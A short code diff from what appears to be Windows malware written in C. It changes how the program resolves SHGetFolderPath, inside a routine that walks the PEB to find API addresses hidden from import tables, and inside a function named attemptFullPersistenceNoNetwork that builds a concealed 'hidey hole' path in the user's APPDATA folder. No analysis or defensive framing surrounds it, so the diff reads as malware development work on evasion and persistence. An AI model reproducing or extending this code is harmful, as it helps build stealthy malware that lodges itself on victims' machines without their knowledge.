@@ -260,7 +260,7 @@ void GetAPIFromPeb() {
 
 		if (shell32Base == NULL) shell32Base = pLoadLibraryA("Shell32.dll");
 
-		pSHGetFolderPath = (SHGETFOLDERPATH)GetProcAddressWalk(shell32Base, "SHGetFolderPath");
+		pSHGetFolderPath = (SHGETFOLDERPATH)GetProcAddressWalk(shell32Base, "SHGetFolderPathA");
 	}
 }
 
@@ -453,7 +453,7 @@ void attemptFullPersistenceNoNetwork(TCHAR* dirName) {
 	// Construct new hidey hole spot
 
 	TCHAR wszPath[MAX_PATH] = L"";
-	pSHGetFolderPath(NULL, CSIDL_APPDATA, NULL, 0, wszPath);
+	SHGetFolderPath(NULL, CSIDL_APPDATA, NULL, 0, wszPath);
 
 	wcscat(wszPath, name);
 
